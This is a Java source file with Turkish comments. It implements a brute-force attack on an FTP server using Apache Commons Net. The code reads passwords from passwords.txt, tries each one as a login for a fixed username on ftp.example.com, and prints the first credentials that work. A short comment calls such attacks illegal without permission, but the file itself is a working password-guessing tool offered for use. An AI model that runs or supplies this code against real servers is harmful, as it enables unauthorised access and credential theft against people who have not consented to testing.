import org.apache.commons.net.ftp.FTPClient;

import java.io.BufferedReader;
import java.io.FileReader;
import java.io.IOException;

/*
- Brute force saldırısı, bir şifreleme veya kimlik doğrulama sisteminin zayıf noktalarını keşfetmek için 
deneme-yanılma yöntemini kullanan bir saldırı türüdür. 

- Ancak, bu tür saldırılar yasa dışıdır ve başka kişilerin veya sistemlerin izni olmadan gerçekleştirilmemelidir. 

- Apache Commons Net kütüphanesini kullanarak FTP sunucusuna oturum açmak için 
brute force yöntemini deneyen basit bir Java örneğidir. 

- Sunucuya oturum açmak için belirli bir şifre listesini deneyerek başarılı bir şifreyi bulmayı hedefler. 

- passwords.txt adlı bir metin dosyasında şifrelerin bulunduğu varsayılmalıdır.

- Alttaki kod, passwords.txt adlı bir dosyadan şifreleri okur ve her bir şifreyle FTP sunucusuna oturum açmaya çalışır. 
Eğer başarılı bir oturum açma gerçekleşirse, kullanıcı adını ve şifreyi ekrana yazdırır ve döngüden çıkar.

*/
public class FTPBruteForceExample {
    public static void main(String[] args) {
        String server = "ftp.example.com";
        int port = 21;
        String username = "your-username";
        String passwordsFile = "passwords.txt";

        FTPClient ftpClient = new FTPClient();

        try {
            BufferedReader reader = new BufferedReader(new FileReader(passwordsFile));
            String password;

            while ((password = reader.readLine()) != null) {
                ftpClient.connect(server, port);
                boolean loginSuccessful = ftpClient.login(username, password);

                if (loginSuccessful) {
                    System.out.println("Successful login! Username: " + username + ", Password: " + password);
                    break;
                }

                ftpClient.logout();
            }

            reader.close();
        } catch (IOException e) {
            e.printStackTrace();
        } finally {
            if (ftpClient.isConnected()) {
                try {
                    ftpClient.disconnect();
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }
        }
    }
}
